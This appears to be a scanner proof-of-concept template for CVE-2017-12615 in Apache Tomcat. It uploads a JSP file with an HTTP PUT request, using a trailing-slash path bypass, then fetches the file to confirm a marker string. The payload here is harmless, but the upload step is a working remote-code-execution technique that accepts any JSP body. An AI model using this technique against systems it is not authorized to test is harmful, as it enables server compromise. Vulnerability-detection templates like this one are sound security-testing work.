[info]
author = "ave"
description = "通过 HTTP PUT 方法上传 JSP webshell 至 Apache Tomcat 服务器，验证远程代码执行漏洞 CVE-2017-12615。仅用于安全检测，不执行破坏性操作。"
id = "POC-AVE-2017-0506"
name = "Apache Tomcat PUT 文件上传远程代码执行漏洞 PoC"
severity = "high"
tags = [
    "cve-2017-12615",
    "tomcat",
    "rce",
    "file-upload",
]
vuln_id = [
    "CVE-2017-12615",
    "AVE-2017-0506",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PUT"
path = "/{{BaseURL}}/poc.jsp/"
protocol = "http"

[poc.requests.body]
content = '<% out.print("AVE_POC_TEST"); %>'
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [
    201,
    204,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_POC_TEST"]
